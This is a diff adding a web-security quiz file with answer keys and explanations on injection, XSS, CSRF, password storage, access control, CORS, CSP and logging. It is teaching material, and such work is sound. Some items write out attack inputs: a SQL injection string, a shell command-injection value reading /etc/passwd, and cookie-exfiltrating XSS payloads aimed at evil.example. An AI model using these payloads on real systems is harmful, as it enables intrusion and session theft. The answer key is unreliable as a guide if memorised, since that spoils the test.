+      "CORS only controls which pages may read responses; add HSTS and a strict CSP, and log security events without logging secrets."
+    ],
+    "feynmanPrompt": "Explain to a new developer how an attacker could read other customers' invoices just by changing a number in the URL, and the server-side change that prevents it."
+  },
+  "questions": [
+    {
+      "id": "swe-web-security-q01",
+      "type": "debug",
+      "difficulty": "easy",
+      "question": "What is the vulnerability in this lookup?",
+      "code": "def find_user(email):\n    query = \"SELECT id, password_hash FROM users WHERE email = '\" + email + \"'\"\n    return db.execute(query).fetchone()",
+      "language": "python",
+      "choices": [
+        "fetchone() can return more than one row",
+        "password_hash should never be selected in a query",
+        "SQL injection: the email is concatenated into the SQL, so crafted input changes the query",
+        "The email must be lowercased before the lookup"
+      ],
+      "answer": 2,
+      "explanation": "The email is concatenated into the SQL text, so an input such as `' OR '1'='1' --` rewrites the query. Use a placeholder: `db.execute(\"SELECT ... WHERE email = ?\", (email,))`.",
+      "concept": "SQL injection",
+      "section": 0
+    },
+    {
+      "id": "swe-web-security-q02",
+      "type": "debug",
+      "difficulty": "medium",
+      "question": "What is the vulnerability in this admin tool?",
+      "code": "@app.post(\"/tools/ping\")\ndef ping():\n    host = request.form[\"host\"]\n    output = subprocess.check_output(f\"ping -c 1 {host}\", shell=True)\n    return output",
+      "language": "python",
+      "choices": [
+        "Command injection: with shell=True, input like `8.8.8.8; cat /etc/passwd` runs extra commands",
+        "check_output cannot run ping",
+        "request.form is read-only and raises an error",
+        "ping needs -c 4 to work reliably"
+      ],
+      "answer": 0,
+      "explanation": "With shell=True the whole string goes to a shell, so `8.8.8.8; cat /etc/passwd` runs a second command on the server. Use `subprocess.run([\"ping\", \"-c\", \"1\", host])` without a shell, and validate host as an IP address or hostname.",
+      "concept": "Command injection",
+      "section": 0
+    },
+    {
+      "id": "swe-web-security-q03",
+      "type": "code-fill",
+      "difficulty": "medium",
+      "question": "Complete the call so the id is sent as a bound parameter with node-postgres.",
+      "code": "const result = await db.query('SELECT * FROM orders WHERE id = $1', _____)",
+      "language": "javascript",
+      "choices": [
+        "req.params.id",
+        "[req.params.id]",
+        "`'${req.params.id}'`",
+        "{ id: req.params.id }"
+      ],
+      "answer": 1,
+      "explanation": "node-postgres takes the values as an array matching $1, $2 and so on. A bare string or an object is the wrong shape, and building a quoted string reintroduces injection.",
+      "concept": "Parameters in node-postgres",
+      "section": 0
+    },
+    {
+      "id": "swe-web-security-q04",
+      "type": "mcq",
+      "difficulty": "hard",
+      "question": "A tool passes a user-supplied value to a program as one list argument with `subprocess.run`, and no shell. A user submits a value that begins with `--`. What risk remains?",
+      "choices": [
+        "None, because list arguments can never be misinterpreted",
+        "Shell commands chained with a semicolon",
+        "The program may treat the value as an option (argument injection), so validate it and reject leading dashes",
+        "SQL injection through the argument list"
+      ],
+      "answer": 2,
+      "explanation": "Without a shell, `;` and `$()` are harmless, but the program itself still parses its arguments, and a value starting with dashes can be read as an option. Validate the value against an allowlist and reject leading dashes, or pass `--` before user arguments where the program supports it.",
+      "concept": "Argument injection",
+      "section": 0
+    },
+    {
+      "id": "swe-web-security-q05",
+      "type": "match",
+      "difficulty": "medium",
+      "question": "Match each term to the matching example or definition.",
+      "pairs": [
+        {
+          "left": "Stored XSS",
+          "right": "A malicious review is saved and runs for every visitor"
+        },
+        {
+          "left": "Reflected XSS",
+          "right": "A crafted link's query parameter is echoed into the server's response"
+        },
+        {
+          "left": "DOM-based XSS",
+          "right": "Page JavaScript writes location.hash into innerHTML"
+        },
+        {
+          "left": "Output encoding",
+          "right": "Turning < into &lt; so the browser shows text instead of markup"
+        }
+      ],
+      "explanation": "Stored XSS is saved and served to others, reflected XSS bounces off the server from the request, DOM XSS happens entirely in page JavaScript, and output encoding is the defense that turns markup into text.",
+      "concept": "XSS types",
+      "section": 1
+    },
+    {
+      "id": "swe-web-security-q06",
+      "type": "debug",
+      "difficulty": "medium",
+      "question": "What is the vulnerability here?",
+      "code": "const params = new URLSearchParams(location.search)\ndocument.querySelector('#results-title').innerHTML =\n  'Results for ' + params.get('q')",
+      "language": "javascript",
+      "choices": [
+        "URLSearchParams cannot read the q parameter",
+        "querySelector must be replaced with getElementById",
+        "innerHTML is slower than textContent",
+        "DOM XSS: q is inserted as HTML, so a crafted link runs script; use textContent"
+      ],
+      "answer": 3,
+      "explanation": "The q parameter is written into the page as HTML, so a link with `q=<img src=x onerror=...>` runs the attacker's script in your origin. Set textContent instead, which always treats the value as text.",
+      "concept": "DOM XSS",
+      "section": 1
+    },
+    {
+      "id": "swe-web-security-q07",
+      "type": "debug",
+      "difficulty": "hard",
+      "question": "Users can edit their own bio. What is the vulnerability in this component?",
+      "code": "function Profile({ user }) {\n  return (\n    <section>\n      <h2>{user.name}</h2>\n      <div dangerouslySetInnerHTML={{ __html: user.bio }} />\n    </section>\n  )\n}",
+      "language": "javascript",
+      "choices": [
+        "Stored XSS: the bio is inserted as raw HTML, bypassing React's escaping",
+        "{user.name} is not escaped by React",
+        "A section element cannot contain a div",
+        "dangerouslySetInnerHTML only works in class components"
+      ],
+      "answer": 0,
+      "explanation": "React escapes {user.name}, but dangerouslySetInnerHTML bypasses escaping, so a bio containing an img tag with onerror runs for every profile visitor: stored XSS. Render the bio as text, or sanitize it with DOMPurify if rich formatting is needed.",
+      "concept": "dangerouslySetInnerHTML",
+      "section": 1
+    },
+    {
+      "id": "swe-web-security-q08",
+      "type": "mcq",
+      "difficulty": "hard",
+      "question": "A profile page renders `<a href=\"{website}\">My site</a>`, applying HTML attribute encoding to the user's website value. Which value is still dangerous?",
+      "choices": [
+        "https://example.com",
+        "javascript:fetch('https://evil.example/?c='+document.cookie)",
+        "<script>alert(1)</script>",
+        "\"><img src=x onerror=alert(1)>"
+      ],
+      "answer": 1,
+      "explanation": "Encoding neutralizes quotes and angle brackets, so the last two values stay inert. `javascript:` contains nothing to encode, and clicking the link runs the code. URLs need their scheme checked: allow only http and https.",
+      "concept": "Context matters",
+      "section": 1
+    },
+    {
+      "id": "swe-web-security-q09",
+      "type": "mcq",
+      "difficulty": "hard",
+      "question": "The session cookie is `SameSite=Lax`. Which request started from an attacker's site still carries the victim's cookie?",
+      "choices": [
+        "A cross-site form POST to https://bank.example/transfer",
+        "A fetch() call with credentials: 'include'",
+        "A top-level GET navigation to https://bank.example/account/delete?confirm=yes",
+        "An image request from an <img> tag on the attacker's page"
+      ],
+      "answer": 2,
+      "explanation": "Lax sends cookies on top-level navigations with safe methods, such as following a link. Cross-site POSTs, fetch calls and image requests go without it. That is exactly why state must never change on GET.",
+      "concept": "What SameSite=Lax allows",
+      "section": 2
+    },
+    {
+      "id": "swe-web-security-q10",
+      "type": "debug",
+      "difficulty": "medium",
+      "question": "What is the security problem with this route?",
+      "code": "@app.get(\"/account/delete\")\n@login_required\ndef delete_account():\n    current_user.delete()\n    return redirect(\"/goodbye\")",
+      "language": "python",
+      "choices": [
+        "login_required does not work on GET routes",
+        "A state-changing action on GET: another site can trigger it by navigating the user there, and Lax cookies are still sent",
+        "redirect leaks the user's password in the URL",
+        "delete() must be called after the redirect"
+      ],
+      "answer": 1,
+      "explanation": "Deleting an account on GET means any site can trigger it by navigating the user there, and SameSite=Lax still sends cookies on top-level GET navigations. Use POST (or DELETE) with CSRF protection and a confirmation step.",
+      "concept": "State change on GET",
+      "section": 2
+    },
+    {
+      "id": "swe-web-security-q11",
+      "type": "multi",
+      "difficulty": "medium",
+      "question": "Which of these defend against CSRF? Select all that apply.",
+      "choices": [
+        "SameSite=Lax or Strict on the session cookie",
+        "CSRF tokens checked on state-changing requests",
+        "Rejecting requests whose Origin header is not your site",
+        "Hiding the form's submit button from logged-out users",
+        "Switching from GET to POST with no other protection",
+        "Adding Access-Control-Allow-Origin: *"
+      ],
+      "answers": [
+        0,
+        1,
+        2
+      ],
+      "explanation": "SameSite cookies, CSRF tokens and Origin checks each stop forged cross-site requests. Hiding a button does nothing, a POST alone is still forgeable by an auto-submitting form, and a wildcard CORS header is unrelated (and often harmful).",
+      "concept": "CSRF defenses",
+      "section": 2
+    },
+    {
+      "id": "swe-web-security-q12",
+      "type": "debug",
+      "difficulty": "easy",
+      "question": "What is wrong with how this code stores passwords?",
+      "code": "def create_user(email, password):\n    pw_hash = hashlib.sha256(password.encode()).hexdigest()\n    db.execute(\"INSERT INTO users (email, pw_hash) VALUES (?, ?)\", (email, pw_hash))",
+      "language": "python",
+      "choices": [
+        "The INSERT statement is vulnerable to SQL injection",
+        "SHA-256 is fast and unsalted here, so leaked hashes are cheap to crack; use Argon2id or bcrypt",
+        "hexdigest() makes the hash reversible",
+        "Passwords should be encrypted with AES instead"
+      ],
+      "answer": 1,
+      "explanation": "SHA-256 is fast and, here, unsalted, so leaked hashes can be cracked at billions of guesses per second, and identical passwords share a hash. Use Argon2id or bcrypt. The INSERT itself is parameterized, so it is not an injection risk.",
+      "concept": "Fast password hashes",
+      "section": 3
+    },
+    {
+      "id": "swe-web-security-q13",
+      "type": "code-fill",
+      "difficulty": "medium",
+      "question": "Complete the function so it correctly checks a login attempt against the stored bcrypt hash.",
+      "code": "def verify(password: str, stored_hash: bytes) -> bool:\n    return bcrypt.checkpw(password.encode(), _____)",
+      "language": "python",
+      "choices": [
+        "bcrypt.hashpw(password.encode(), bcrypt.gensalt())",
+        "bcrypt.gensalt()",
+        "stored_hash",
+        "hashlib.sha256(password.encode()).digest()"
+      ],
+      "answer": 2,
+      "explanation": "checkpw takes the attempt and the stored hash, reads the salt and cost from the stored hash, and compares safely. Hashing the attempt again with a new salt would never match, and SHA-256 is a different algorithm entirely.",
+      "concept": "Verifying with bcrypt",
+      "section": 3
+    },
+    {
+      "id": "swe-web-security-q14",
+      "type": "mcq",
+      "difficulty": "medium",
+      "question": "A login form answers 'No account with that email' or 'Wrong password', depending on which is true. What is the problem?",
+      "choices": [
+        "It reveals which emails have accounts, so use one generic message",
+        "It makes the login page noticeably slower",
+        "It means passwords are stored in plaintext",
+        "It stops password managers from filling the form"
+      ],
+      "answer": 0,
+      "explanation": "Different messages let anyone discover which emails have accounts, which helps targeted phishing and credential stuffing. Use one message, 'Invalid email or password', and the same idea for password reset.",
+      "concept": "Account enumeration",
+      "section": 3
+    },
+    {
+      "id": "swe-web-security-q15",
+      "type": "multi",
+      "difficulty": "medium",
+      "question": "Which of these are good authentication practices? Select all that apply.",
+      "choices": [
+        "Hash passwords with Argon2id or bcrypt",
+        "Rate-limit login attempts per account and per IP",
+        "Regenerate the session id after a successful login",
+        "Encrypt passwords with AES so support staff can read them",
+        "Hash with SHA-256 and one site-wide salt",
+        "Email users their password after signup"
+      ],
+      "answers": [
+        0,
+        1,
+        2
+      ],
+      "explanation": "Slow salted hashing, rate limiting and a fresh session id after login are all standard. Reversible encryption, a fast hash with one shared salt, and emailing passwords all expose users' passwords.",
+      "concept": "Authentication practices",
+      "section": 3
+    },
+    {
+      "id": "swe-web-security-q16",
+      "type": "recall",
+      "difficulty": "medium",
+      "question": "What is a salt, and why does every password get its own?",
+      "answer": "A salt is a random value stored with each password hash and mixed into the hashing. A unique salt per password makes identical passwords hash differently, so attackers cannot use precomputed tables or crack everyone who shares a password in one go.",
+      "explanation": "Argon2id and bcrypt handle salts automatically and store them inside the hash string, so you never manage them by hand.",
+      "concept": "Salts",
+      "section": 3
+    },
+    {
+      "id": "swe-web-security-q17",
+      "type": "debug",
+      "difficulty": "medium",
+      "question": "Any logged-in user can download this file endpoint's documents. What is the vulnerability?",
+      "code": "app.get('/api/documents/:id/download', requireLogin, async (req, res) => {\n  const doc = await Documents.findById(req.params.id)\n  if (!doc) return res.sendStatus(404)\n  res.download(doc.path)\n})",
+      "language": "javascript",
+      "choices": [
+        "requireLogin must come after the route handler",
+        "res.download is vulnerable to SQL injection",
+        "IDOR: ownership is never checked, so changing the id downloads other users' documents",
+        "A missing document should return 500, not 404"
+      ],
+      "answer": 2,
+      "explanation": "The handler checks that someone is logged in but never that the document belongs to them, so changing the id in the URL downloads other people's files. Scope the lookup to the user, for example findOne({ id, ownerId: req.user.id }).",
+      "concept": "IDOR",
+      "section": 4
+    },
+    {
+      "id": "swe-web-security-q18",
+      "type": "debug",
+      "difficulty": "hard",
+      "question": "What can a user do with this endpoint that they should not be able to?",
+      "code": "app.patch('/api/users/me', requireLogin, async (req, res) => {\n  await Users.update(req.user.id, req.body)\n  res.json(await Users.findById(req.user.id))\n})",
+      "language": "javascript",
+      "choices": [
+        "Update other users' profiles by changing the URL",
+        "Read other users' password hashes",
+        "Nothing, because the user id comes from the session",
+        "Send fields such as {\"role\": \"admin\"} and grant themselves privileges, because the whole body is applied"
+      ],
+      "answer": 3,
+      "explanation": "The whole request body is applied to the user's row, so a request with {\"role\": \"admin\"} or {\"email_verified\": true} grants privileges. The id comes from the session, so other users' rows are safe, but the fields must be allowlisted.",
+      "concept": "Mass assignment",
+      "section": 4
+    },
+    {
+      "id": "swe-web-security-q19",
+      "type": "mcq",
+      "difficulty": "easy",
+      "question": "The admin panel link is hidden from non-admins, but the `/api/admin/users` endpoint has no role check. Is hiding the link enough?",
+      "choices": [
+        "Yes, users cannot find links that are hidden",
+        "Yes, as long as the site uses HTTPS",
+        "No, anyone can call the API directly, so the server must check the role on every request",
+        "No, but removing the link from the HTML source would be enough"
+      ],
+      "answer": 2,
+      "explanation": "The API is reachable by anyone who sends the request, through curl or the browser's developer tools. The server must check the role on every request; hiding UI is a convenience, not security.",
+      "concept": "Server-side checks",
+      "section": 4
+    },
+    {
+      "id": "swe-web-security-q20",
+      "type": "mcq",
+      "difficulty": "medium",
+      "question": "A team switches invoice ids to random UUIDs and removes the ownership check, because 'nobody can guess them now'. What is wrong with that?",
+      "choices": [
+        "UUIDs are easy to guess in sequence",
+        "Ids leak through links, logs and emails, so anyone holding one could read the invoice; the ownership check is still needed",
+        "UUIDs cannot be used with HTTPS",
+        "Nothing; unguessable ids are complete access control"
+      ],
+      "answer": 1,
+      "explanation": "Unguessable ids still leak through shared links, emails, logs, browser history and referrer headers. Whoever holds one could read the invoice. Keep the server-side ownership check; UUIDs are a bonus, not a replacement.",
+      "concept": "UUIDs are not access control",
+      "section": 4
+    },
+    {
+      "id": "swe-web-security-q21",
+      "type": "order",
+      "difficulty": "medium",
+      "question": "An API key was pushed to a public repository. Put the response steps in order.",
+      "items": [
+        "Revoke or rotate the leaked key at the provider",
+        "Deploy the new key to every service that needs it",
+        "Check the provider's logs for misuse during the exposure",
+        "Remove the secret from the git history",
+        "Turn on secret scanning so it cannot happen silently again"
+      ],
+      "explanation": "Revoking first makes any stolen copy useless. Then restore service with the new key, look for misuse during the exposure, and only then clean up history and add scanning so it cannot happen silently again.",
+      "concept": "Responding to a leaked secret",
+      "section": 5
+    },
+    {
+      "id": "swe-web-security-q22",
+      "type": "debug",
+      "difficulty": "medium",
+      "question": "This code is in a React app built with Vite. What is the problem?",
+      "code": "// src/refunds.js (frontend)\nexport async function refund(chargeId) {\n  return fetch('https://api.payments.example/v1/refunds', {\n    method: 'POST',\n    headers: { Authorization: `Bearer ${import.meta.env.VITE_PAYMENTS_SECRET_KEY}` },\n    body: JSON.stringify({ charge: chargeId })\n  })\n}",
+      "language": "javascript",
+      "choices": [
+        "VITE_ variables are bundled into client code, so every visitor can read the secret key",
+        "fetch cannot send an Authorization header",
+        "import.meta.env is always undefined in production builds",
+        "JSON.stringify exposes the key in the request body"
+      ],
+      "answer": 0,
+      "explanation": "Vite bundles every VITE_ variable into the JavaScript sent to browsers, so any visitor can read the secret key and issue refunds. Secret keys must stay on your server; the browser calls your API, which calls the provider.",
+      "concept": "Secrets in frontend code",
+      "section": 5
+    },
+    {
+      "id": "swe-web-security-q23",
+      "type": "cli",
+      "difficulty": "easy",
+      "question": "Type the command that checks a Node.js project's dependencies for known vulnerabilities.",
+      "shell": "bash",
+      "answer": "npm audit",
+      "accept": [
+        "npm audit --omit=dev",
+        "npm audit --production"
+      ],
+      "explanation": "npm audit compares your installed dependency tree, including transitive packages, against a database of known vulnerabilities. pip-audit does the same for Python environments.",
+      "concept": "npm audit",
+      "section": 5
+    },
+    {
+      "id": "swe-web-security-q24",
+      "type": "mcq",
+      "difficulty": "easy",
+      "question": "A pull request adds a dependency named `reqeusts` to requirements.txt. What should the reviewer suspect?",
+      "choices": [
+        "A newer and faster fork of requests",
+        "A typosquatted package imitating requests, which may run malicious code",
+        "A harmless typo that pip corrects automatically",
+        "A Windows-only build of requests"
+      ],
+      "answer": 1,
+      "explanation": "Typosquatted packages copy a popular name with a small misspelling and may run malicious code during install or import. pip installs exactly the name you give it; it never corrects spelling.",
+      "concept": "Typosquatting",
+      "section": 5
+    },
+    {
+      "id": "swe-web-security-q25",
+      "type": "mcq",
+      "difficulty": "medium",
+      "question": "An API team says: 'Our CORS policy only allows https://app.example.com, so attackers cannot call our API.' What is wrong with that claim?",
+      "choices": [
+        "CORS policies expire after 24 hours",
+        "CORS applies only to GET requests",
+        "Nothing, because CORS blocks every other client",
+        "Only browsers enforce CORS; curl and scripts ignore it, so the API still needs real authentication and authorization"
+      ],
+      "answer": 3,
+      "explanation": "CORS is enforced by browsers when a page tries to read a response. curl, scripts and other servers ignore it entirely, so the API still needs authentication and authorization on every request.",
+      "concept": "CORS does not protect servers",
+      "section": 6
+    },
+    {
+      "id": "swe-web-security-q26",
+      "type": "debug",
+      "difficulty": "hard",
+      "question": "What is the risk in this CORS middleware?",
+      "code": "app.use((req, res, next) => {\n  res.set('Access-Control-Allow-Origin', req.headers.origin)\n  res.set('Access-Control-Allow-Credentials', 'true')\n  next()\n})",
+      "language": "javascript",
+      "choices": [
+        "Browsers reject every credentialed request it allows",
+        "Any website can make requests with users' cookies and read the responses",
+        "It blocks requests from your own frontend",
+        "It only matters for HTTP, not HTTPS"
+      ],
+      "answer": 1,
+      "explanation": "Reflecting any Origin while allowing credentials means every website gets permission to make requests with the user's cookies and read the responses. A malicious page can then read logged-in users' data. Check the origin against an explicit allowlist.",
+      "concept": "Reflected origin with credentials",
+      "section": 6
+    },
+    {
+      "id": "swe-web-security-q27",
+      "type": "typed",
+      "difficulty": "easy",
+      "question": "Which response header tells browsers to use only HTTPS for your domain for a set period of time?",
+      "answer": "Strict-Transport-Security",
+      "accept": [
+        "HSTS",
+        "Strict-Transport-Security:"
+      ],
+      "explanation": "Strict-Transport-Security (HSTS), for example `Strict-Transport-Security: max-age=31536000; includeSubDomains`. Browsers ignore it when it arrives over plain HTTP.",
+      "concept": "HSTS header",
+      "section": 6
+    },
+    {
+      "id": "swe-web-security-q28",
+      "type": "mcq",
+      "difficulty": "hard",
+      "question": "A site sends `Content-Security-Policy: script-src 'self' 'unsafe-inline'`. An attacker injects `<img src=x onerror=\"fetch('https://evil.example/?c='+document.cookie)\">` through an XSS bug. Does the CSP stop it?",
+      "choices": [
+        "No: 'unsafe-inline' allows inline event handlers, so the injected handler runs",
+        "Yes: 'self' blocks every HTML attribute",
+        "Yes: CSP blocks all images from other domains",
+        "No, because CSP only applies to stylesheets"
+      ],
+      "answer": 0,
+      "explanation": "'unsafe-inline' allows inline scripts and inline event handlers, so the injected onerror runs. Without it, a script-src of 'self' would block the handler. Use nonces or hashes for legitimate inline scripts instead.",
+      "concept": "CSP and unsafe-inline",
+      "section": 6
+    },
+    {
+      "id": "swe-web-security-q29",
+      "type": "typed",
+      "difficulty": "medium",
+      "question": "What is the name of the response header that declares which sources may supply scripts, styles, images and frames on your pages?",
+      "answer": "Content-Security-Policy",
+      "accept": [
+        "CSP",
+        "Content-Security-Policy:",
+        "Content Security Policy"
+      ],
+      "explanation": "Content-Security-Policy. Roll a new policy out with Content-Security-Policy-Report-Only first, to see what it would block before enforcing it.",
+      "concept": "CSP header name",
+      "section": 6
+    },
+    {
+      "id": "swe-web-security-q30",
+      "type": "debug",
+      "difficulty": "easy",
+      "question": "What is the problem with this login handler?",
+      "code": "@app.post(\"/login\")\ndef login():\n    email = request.form[\"email\"]\n    password = request.form[\"password\"]\n    logger.info(f\"Login attempt: {email} / {password}\")\n    ...",
+      "language": "python",
+      "choices": [
+        "f-strings are not allowed inside logging calls",
+        "It should use logger.debug instead of logger.info",
+        "It writes plaintext passwords into the logs",
+        "The email should be logged in uppercase"
+      ],
+      "answer": 2,
+      "explanation": "It writes every login attempt's password into the logs in plaintext, where many people and systems can read it for a long time. Log the event with an id or IP and a reason, never the password. Changing the log level would not fix the leak.",
+      "concept": "Passwords in logs",
+      "section": 7
+    },
+    {
+      "id": "swe-web-security-q31",
+      "type": "multi",
+      "difficulty": "medium",
+      "question": "Which of these should never be written to application logs? Select all that apply.",
+      "choices": [
+        "Session cookies and Authorization headers",
+        "Full payment card numbers",
+        "Password reset tokens",
+        "The user id of a failed login attempt",
+        "Request ids",
+        "Timestamps of permission denials"
+      ],
+      "answers": [
+        0,
+        1,
+        2
+      ],
+      "explanation": "Session cookies, authorization headers, card numbers and reset tokens let anyone who reads the logs act as the user or steal money. User ids, request ids and timestamps of security events are exactly what logs are for.",
+      "concept": "What never to log",
+      "section": 7
+    },
+    {
+      "id": "swe-web-security-q32",
+      "type": "mcq",
+      "difficulty": "hard",
+      "question": "A plain-text log line is written as `logger.info(\"login failed for \" + username)`. An attacker submits a username containing a newline followed by `INFO login succeeded for admin`. What happens, and what helps?",
+      "choices": [
+        "The logger crashes on the newline character",
+        "The attacker is logged in as admin",
+        "Nothing, because log files ignore newlines",
+        "The attacker forges a fake log entry; structured JSON logging or escaping newlines prevents it"
+      ],
+      "answer": 3,
+      "explanation": "The newline ends the real entry, and the rest appears as a separate, forged log line that can mislead investigators. Structured logging (JSON, values as fields) or escaping newlines prevents it.",
+      "concept": "Log injection",
+      "section": 7
+    }
+  ]
+}
